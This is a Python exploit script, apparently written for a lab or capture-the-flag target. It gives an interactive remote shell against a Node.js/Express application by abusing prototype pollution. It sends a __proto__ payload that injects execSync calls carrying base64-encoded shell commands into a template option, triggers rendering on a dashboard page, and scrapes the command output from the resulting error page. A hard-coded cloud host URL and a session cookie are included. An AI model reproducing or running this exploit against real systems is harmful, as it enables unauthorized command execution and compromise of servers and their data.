
# In this script demostrated a Prototype Pollution vulnerability with Node.js && Express stack via Base64 decoding , execSync() with a error massage to stdout because an application renders only error

#!/usr/bin/env python3
import requests
import re
import base64
from html import unescape

BASE_URL = "http://a744c1200ac8c489fa88188776c95403-874749701.us-west-2.elb.amazonaws.com:3000" # CHANGE
PATCH_URL = f"{BASE_URL}/api/preferences/notifications" # CHANGE
TRIGGER_URL = f"{BASE_URL}/dashboard" # CHANGE

SESSION_COOKIE = "connect.sid=s%3AB6LoqrB2qF7Jrpw2WKbwHBE_UJpn_TKh.tjoowlq%2FBiphwkWbrhqH%2BoKWXGD4EW2MKMzZHGtLcW8"  # CHANGE

PATCH_PAYLOAD = {
    "email": {
        "orderReceived": True, "orderShipped": True, "orderDelivered": True,
        "paymentReceived": True, "lowInventory": True, "weeklyReport": True,
        "marketing": False
    },
    "sms": {"orderReceived": False, "lowInventory": True, "paymentReceived": False},
    "thresholds": {"lowInventoryAlert": 10, "highValueOrderAlert": 500},
}


def execute(cmd):
    cmd_b64 = base64.b64encode(f"{cmd} 1>&2; exit 1".encode()).decode()
    js = f"x;process.mainModule.require('child_process').execSync(Buffer.from('{cmd_b64}','base64').toString())//"

    payload = {
        **PATCH_PAYLOAD,
        "__proto__": {
            "outputFunctionName": js,
            "cache": False,      
        }
    }

    s = requests.Session()
    headers = {"Cookie": SESSION_COOKIE}

    patch_resp = s.patch(PATCH_URL, json=payload, headers=headers)
    if patch_resp.status_code not in (200, 204):
        return f"[!] PATCH failed: {patch_resp.status_code} — check SESSION_COOKIE"

    resp = s.get(TRIGGER_URL, headers=headers)
    return parse(resp.text)


def parse(html):
    html = re.sub(r'<br\s*/?>', '\n', html)
    text = re.sub(r'<[^>]+>', '', html)
    text = unescape(text).replace('\xa0', ' ')

    match = re.search(r'Command failed:.+?\n(.*?)\n\s+at\s', text, re.DOTALL)
    if match:
        return match.group(1).strip()

    return "[no output]"


if __name__ == "__main__":
    if not SESSION_COOKIE:
        print("[!] Put SESSION_COOKIE into a script")
        exit(1)

    print("[*] Prototype Pollution RCE shell")
    print("[*] type 'exit' to quit\n")

    while True:
        try:
            cmd = input("$ ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if cmd == "exit":
            break
        if cmd:
            print(execute(cmd))

